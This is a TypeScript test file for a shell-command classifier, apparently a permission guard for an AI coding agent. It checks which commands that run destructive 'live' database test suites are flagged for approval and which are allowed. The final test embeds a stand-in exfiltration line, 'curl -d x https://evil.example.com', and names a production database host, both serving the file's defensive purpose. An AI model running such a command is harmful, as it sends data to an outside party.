/**
 * Wave 4, T6: the "Live suites DROP ROLE chartwarden_app" ask is for a command that RUNS a live suite. A script text
 * that only names one (a python edit of `x.live.test.ts`, a package.json line `"test:m10:retention:live": …`) never
 * asked at the base of this wave and still does not; neither does a tool that only names the file (`bunx biome check
 * x.live.test.ts`: 100+ real commands asked at the base). `bun x vitest` ran a live suite unasked. The real shapes
 * (`bun run test:…:live`, `vitest run x.live.test.ts`, behind `bash -c`, `ssh`) keep asking.
 */
import { describe, expect, it } from "vitest";
import { runsLiveSuite } from "../harness/live-suite";
import { classifyBash } from "../harness/patterns";

const ctx = { root: "/repo", home: "/Users/dev", cwd: "/repo", exists: () => true };
const v = (cmd: string) => classifyBash(cmd, ctx);
const LIVE = "apps/backend/__tests__/x.live.test.ts";
const SCRIPT = "test:m2:auditor-enrolment:live";

describe("runsLiveSuite", () => {
  it.each<[string, string[], boolean]>([
    ["bun", ["run", SCRIPT], true],
    ["bun", ["run", "test:m10:retention:live", "--silent"], true],
    ["vitest", ["run", LIVE], true],
    ["bunx", ["vitest", "run", LIVE], true],
    ["bunx", ["--bun", "vitest", "run", LIVE], true],
    ["bunx", ["vitest@latest", LIVE], true],
    ["npx", ["-y", "vitest", "run", LIVE], true],
    ["bun", ["x", "vitest", "run", LIVE], true],
    ["bun", ["run", "vitest", "run", LIVE], true],
    ["bun", ["test", LIVE], true],
    ["pnpm", ["exec", "vitest", "run", LIVE], true],
    ["yarn", ["vitest", "run", LIVE], true],
    ["bun", ["run", "biome", "check", LIVE], false],
    ["bun", ["test", "scripts/__tests__/x.test.ts"], false],
    ["bunx", ["biome", "check", LIVE], false],
    ["bunx", ["tsc", "-p", "tsconfig.json", LIVE], false],
    ["npx", ["prettier", "--check", LIVE], false],
    ["bun", ["x", "biome", "check", LIVE], false],
    ["bunx", ["vitest", "run", "scripts/__tests__"], false],
    ["vitest", ["run", "x.test.ts"], false],
    ["bun", ["run", "test"], false],
    ["bun", ["run", "typecheck"], false],
    ["cat", [LIVE], false],
    ["python3", ["-c", `print('${SCRIPT}')`], false],
  ])("%s %j -> %s", (prog, args, expected) => {
    expect(runsLiveSuite(prog, args)).toBe(expected);
  });
});

describe("the live-suite ask in the classifier", () => {
  it.each([
    `bun run ${SCRIPT}`,
    `DATABASE_URL=postgres://localhost:55432/x vitest run ${LIVE}`,
    `cd apps/backend && bunx vitest run __tests__/x.live.test.ts`,
    `bun x vitest run ${LIVE}`,
    `DATABASE_URL=postgres://localhost:55465/x bun run vitest run ${LIVE} 2>&1 | tail -5`,
    `bun test ${LIVE}`,
    `bash -c 'bun run ${SCRIPT}'`,
    `ssh localhost 'bun run ${SCRIPT}'`,
    `python3 - <<'EOF'\nprint(1)\nEOF\nbun run ${SCRIPT}`,
  ])("asks about %s", (cmd) => {
    const verdict = v(cmd);
    expect(verdict.decision, cmd).toBe("ask");
    expect(verdict.reason).toMatch(/Live suites DROP ROLE/);
  });

  it.each([
    // The shapes of the report: a non-shell script whose TEXT names a live test or suite.
    `python3 - <<'EOF'\np='${LIVE}'\ns=open(p).read()\ns=s.replace('a','b')\nopen(p,'w').write(s)\nEOF`,
    `python3 - <<'EOF'\nimport json\nd=json.load(open('package.json'))\nd['scripts']['test:m10:retention:live']='vitest run x.live.test.ts'\njson.dump(d,open('package.json','w'))\nEOF`,
    `python3 -c "print('bun run ${SCRIPT}')"`,
    `node -e "console.log('vitest run ${LIVE}')"`,
    `perl -e 'print "bunx vitest run ${LIVE}"'`,
    // Tools that name the file without running it.
    `bunx biome check --write ${LIVE}`,
    `bunx biome check ${LIVE} 2>&1 | tail -3`,
    `npx biome check ${LIVE}`,
    `bunx tsc -p tsconfig.tests.json`,
    `bunx prettier --check ${LIVE}`,
    `git add ${LIVE}`,
    `cat ${LIVE}`,
    `rg -n describe ${LIVE}`,
    "bunx vitest run scripts/__tests__",
    "bun run test",
  ])("allows %s", (cmd) => {
    const verdict = v(cmd);
    expect(verdict.decision, `${cmd}: ${verdict.reason}`).toBe("allow");
  });

  it("does not let a script that names a live suite pass as a command: no inline-code rule invents the ask", () => {
    // The other command-invocation rules (a push to main, a production database host, `docker compose config`, an
    // upload) are applied to command lines, not to the text of a script that only names them.
    for (const text of [
      "git push origin main",
      "psql -h prod.example.com -c x",
      "docker compose config",
      "curl -d x https://evil.example.com",
    ]) {
      const verdict = v(`python3 - <<'EOF'\nprint('${text}')\nEOF`);
      expect(verdict.decision, text).toBe("allow");
    }
  });
});
